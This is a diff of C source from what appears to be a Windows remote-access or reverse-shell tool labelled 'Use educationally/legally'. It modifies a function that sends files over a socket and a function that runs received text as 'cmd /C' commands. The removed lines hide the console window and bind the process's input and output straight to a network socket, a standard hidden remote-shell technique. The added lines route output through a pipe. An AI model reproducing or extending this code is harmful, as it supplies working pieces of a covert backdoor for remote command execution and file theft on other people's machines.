@@ -30,10 +30,10 @@ Use educationally/legally.
 
 	// Function for sending file to client (TCP file transfer).
 	int sakito_win_sendf(HANDLE h_file, const SOCKET socket, char* const buf, int32_t f_size) {
-		u_long f_size_bytes = ntohl(f_size); // u_long == int32_t
+		uint32_t f_size_bytes = ntohl(f_size); // u_long == uint32_t
 
 		// Send serialized file size int32 bytes to server.
-		if (send(socket, (char*)&f_size_bytes, sizeof(f_size_bytes), 0) < 1)
+		if (send(socket, (char*)&f_size_bytes, sizeof(uint32_t), 0) < 1)
 			return SOCKET_ERROR;
 
 		int i_result = SUCCESS;
@@ -70,28 +70,28 @@ Use educationally/legally.
 		return i_result;
 	}
 
-	BOOL sakito_win_cp(const SOCKET socket, const LPSTR buf) {
+	BOOL sakito_win_cp(HANDLE child_stdout_write, const LPSTR buf) {
+		// Create a child process that uses the previously created pipes for STDIN and STDOUT.
+		PROCESS_INFORMATION pi; 
 		STARTUPINFO si;
-		PROCESS_INFORMATION pi;
+		memset(&pi, 0, sizeof(pi));
+		memset(&si, 0, sizeof(si));
 
-		ZeroMemory( &si, sizeof(si) );
-		si.cb = sizeof(si);
-		ZeroMemory( &pi, sizeof(pi) );
-
-		if (socket) {
-			si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-			si.wShowWindow = SW_HIDE;
-			si.hStdInput = (HANDLE)socket;
-			si.hStdOutput = (HANDLE)socket;
-			si.hStdError = (HANDLE)socket;
+		// Set up members of the STARTUPINFO structure. 
+		// This structure specifies the STDIN and STDOUT handles for redirection.
+		if (child_stdout_write) {
+			si.cb = sizeof(STARTUPINFO);
+			si.hStdError = child_stdout_write;
+			si.hStdOutput = child_stdout_write;
+			si.dwFlags |= STARTF_USESTDHANDLES;
 		}
 
 		// 7 + 1 for null termination/string truncation.
 		char cmd[BUFLEN+8] = "cmd /C ";
 		strcat(cmd, buf);
 
-	    // Launch the child process & execute the command. 
-	    BOOL i_result = CreateProcess(NULL,
+		// Create the child process.
+		BOOL i_result = CreateProcess(NULL, 
 					cmd,
 					NULL,
 					NULL,
@@ -102,21 +102,20 @@ Use educationally/legally.
 					&si,
 					&pi);
 
-		if (i_result)
-			// Wait until child process exits.
-			WaitForSingleObject(pi.hProcess, INFINITE);
+		if (i_result && child_stdout_write) {
+			// Close handles to the child process and its primary thread and close stdout pipe.
+			CloseHandle(pi.hProcess);
+			CloseHandle(pi.hThread);
+			CloseHandle(child_stdout_write);
+		}
 
-		// Close process and thread handles. 
-		CloseHandle(pi.hProcess);
-		CloseHandle(pi.hThread);
-
-	    return i_result;
+		return i_result;
 	}
 #endif
 
 // Function to copy int bytes to new memory block/location to abide strict aliasing.
-static inline int32_t ntohl_conv(char* const buf) {
-	int32_t new;
+static inline uint32_t ntohl_conv(char* const buf) {
+	uint32_t new;
 	memcpy(&new, buf, sizeof(new));
 
 	// Return deserialized bytes.
